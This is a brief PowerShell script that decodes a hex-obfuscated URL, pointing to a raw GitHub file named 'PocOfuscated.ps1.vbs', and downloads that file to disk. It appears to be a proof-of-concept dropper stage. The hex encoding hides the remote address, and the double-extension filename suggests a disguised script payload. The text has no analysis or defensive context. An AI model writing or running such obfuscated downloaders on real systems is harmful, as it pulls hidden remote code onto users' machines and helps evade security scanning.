$hex = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f4a616261746f39362f504f4341484b2f6d61696e2f506f634f66757363617465642e7073312e766273"
$url = ""
for ($i = 0; $i -lt $hex.Length; $i += 2) {
    $url += [char][convert]::ToUInt32($hex.Substring($i, 2), 16);
}
Invoke-WebRequest -Uri $url -OutFile "PocOfuscated.ps1.vbs"
